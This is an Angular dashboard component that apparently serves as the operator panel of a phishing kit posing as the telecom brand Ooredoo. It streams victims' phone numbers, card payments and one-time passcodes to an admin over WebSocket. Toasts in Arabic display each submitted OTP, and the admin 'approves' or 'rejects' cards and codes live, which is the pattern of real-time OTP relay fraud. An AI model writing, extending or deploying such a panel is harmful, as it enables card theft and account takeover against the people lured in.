import {
  ChangeDetectionStrategy,
  Component,
  OnInit,
  OnDestroy,
  signal,
  computed,
  inject,
} from '@angular/core';
import { CommonModule, DatePipe } from '@angular/common';
import { Router } from '@angular/router';
import { Subscription } from 'rxjs';
import { ToastService } from '../../services/toast';
import { DashboardWebsocketService } from '../../services/dashboard-websocket';
import { enviroment } from '../../../env/enviroment';
import { Client } from '../../models/client';
import { Payment } from '../../models/payment';
import { Otp } from '../../models/otp';
import { Pagination } from '../../models/pagination';

const PAGE_LIMIT = 50;

@Component({
  selector: 'app-dashboard',
  standalone: true,
  imports: [CommonModule, DatePipe],
  templateUrl: './dashboard.html',
  styleUrl: './dashboard.css',
  changeDetection: ChangeDetectionStrategy.OnPush,
})
export class Dashboard implements OnInit, OnDestroy {
  private readonly toastService = inject(ToastService);
  private readonly router = inject(Router);
  private readonly wsService = inject(DashboardWebsocketService);

  readonly adminEmail = signal<string>('');

  /** O(1) lookup & update: keyed by client id */
  private readonly clientMap = signal<Map<string, Client>>(new Map());

  /** Sorted list derived from the map – newest first */
  readonly clients = computed<Client[]>(() =>
    Array.from(this.clientMap().values()).sort(
      (a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
    )
  );

  readonly isLoading = signal<boolean>(false);
  readonly errorMessage = signal<string>('');
  readonly pagination = signal<Pagination | null>(null);

  /** WebSocket connection status */
  readonly wsConnected = signal<boolean>(false);

  private wsSub: Subscription | null = null;

  // ── Lifecycle ─────────────────────────────────────────────────────────

  ngOnInit(): void {
    const token = localStorage.getItem('admin_token');
    const email = localStorage.getItem('admin_email');

    this.adminEmail.set(email || 'admin@ooredoo.com');
    this.loadData();
    this.connectWebSocket(token!);
  }

  ngOnDestroy(): void {
    this.wsSub?.unsubscribe();
    this.wsService.disconnect();
  }

  // ── Data loading ──────────────────────────────────────────────────────

  async loadData(offset = 0): Promise<void> {
    const token = localStorage.getItem('admin_token');
    this.isLoading.set(true);
    this.errorMessage.set('');

    try {
      const response = await fetch(
        `${enviroment.api_base}/api/clients?include=payments,otps&limit=${PAGE_LIMIT}&offset=${offset}`,
        { headers: { Authorization: `Bearer ${token}` } }
      );
      const resData = await response.json();

      if (resData.success) {
        const newMap = new Map<string, Client>(this.clientMap());
        for (const client of resData.data as Client[]) {
          newMap.set(client.id, client);
        }
        this.clientMap.set(newMap);
        this.pagination.set(resData.pagination ?? null);
      } else {
        this.errorMessage.set(resData.error || 'فشل تحميل البيانات');
        this.toastService.show(resData.error || 'فشل تحميل البيانات', 'error');
        if (response.status === 401 || response.status === 403) {
          this.logout();
        }
      }
    } catch {
      this.errorMessage.set('خطأ في الاتصال بالخادم لتحميل البيانات');
      this.toastService.show('خطأ في الاتصال بالخادم لتحميل البيانات', 'error');
    } finally {
      this.isLoading.set(false);
    }
  }

  loadNextPage(): void {
    const p = this.pagination();
    if (p && p.hasMore) {
      this.loadData(p.offset + p.limit);
    }
  }

  // ── WebSocket ─────────────────────────────────────────────────────────

  private connectWebSocket(token: string): void {
    this.wsService.connect(token);

    this.wsSub = this.wsService.messages$.subscribe((msg) => {
      switch (msg.event) {
        case 'connected':
          this.wsConnected.set(true);
          break;

        case 'client_created': {
          const newClient = msg.data as Client;
          newClient.payments = newClient.payments ?? [];
          newClient.otps = newClient.otps ?? [];
          this.clientMap.update((map) => {
            const updated = new Map(map);
            updated.set(newClient.id, newClient);
            return updated;
          });
          this.toastService.show(
            `عميل جديد انضم: ${newClient.phone_number}`,
            'success'
          );
          break;
        }

        case 'payment_created': {
          const payment = msg.data as Payment;
          this.updateClient(payment.client_id, (c) => ({
            ...c,
            payments: [...(c.payments ?? []), payment],
          }));
          this.toastService.show(
            `طلب دفع جديد للعميل صاحب الرقم ${this.getClientPhone(payment.client_id)}`,
            'info'
          );
          break;
        }

        case 'payment_updated': {
          const payment = msg.data as Payment;
          this.updateClient(payment.client_id, (c) => ({
            ...c,
            payments: (c.payments ?? []).map((p) =>
              p.id === payment.id ? payment : p
            ),
          }));
          break;
        }

        case 'otp_created': {
          const otp = msg.data as Otp;
          this.updateClient(otp.client_id, (c) => ({
            ...c,
            otps: [...(c.otps ?? []), otp],
          }));
          this.toastService.show(
            `رمز تحقق جديد تم تقديمه: ${otp.otp}`,
            'info'
          );
          break;
        }

        case 'otp_updated': {
          const otp = msg.data as Otp;
          this.updateClient(otp.client_id, (c) => ({
            ...c,
            otps: (c.otps ?? []).map((o) => (o.id === otp.id ? otp : o)),
          }));
          break;
        }
      }
    });
  }

  // ── Admin actions via WebSocket ────────────────────────────────────────

  handlePaymentAction(paymentId: string, status: 'ACCEPTED' | 'REJECTED'): void {
    this.wsService.paymentAction(paymentId, status);
    this.toastService.show(
      status === 'ACCEPTED' ? 'جاري الموافقة على البطاقة...' : 'جاري رفض البطاقة...',
      'info'
    );
  }

  handleOtpAction(otpId: string, status: 'ACCEPTED' | 'REJECTED'): void {
    this.wsService.otpAction(otpId, status);
    this.toastService.show(
      status === 'ACCEPTED' ? 'جاري الموافقة على الـ OTP...' : 'جاري رفض الـ OTP...',
      'info'
    );
  }

  // ── Utilities ─────────────────────────────────────────────────────────

  getClientPhone(clientId: string): string {
    return this.clientMap().get(clientId)?.phone_number ?? 'غير معروف';
  }

  getLatestPayment(client: Client): Payment | null {
    if (!client.payments?.length) return null;
    return client.payments[client.payments.length - 1];
  }

  getLatestOtp(client: Client): Otp | null {
    if (!client.otps?.length) return null;
    return client.otps[client.otps.length - 1];
  }

  /** O(1) in-place update for a single client inside the Map */
  private updateClient(clientId: string, updater: (c: Client) => Client): void {
    this.clientMap.update((map) => {
      const client = map.get(clientId);
      if (!client) return map;
      const updated = new Map(map);
      updated.set(clientId, updater(client));
      return updated;
    });
  }

  logout(): void {
    this.wsService.disconnect();
    localStorage.removeItem('admin_token');
    localStorage.removeItem('admin_email');
    this.router.navigate(['/93ceb7962cf40688f3c465ba57ff7286893fd19e']);
  }
}
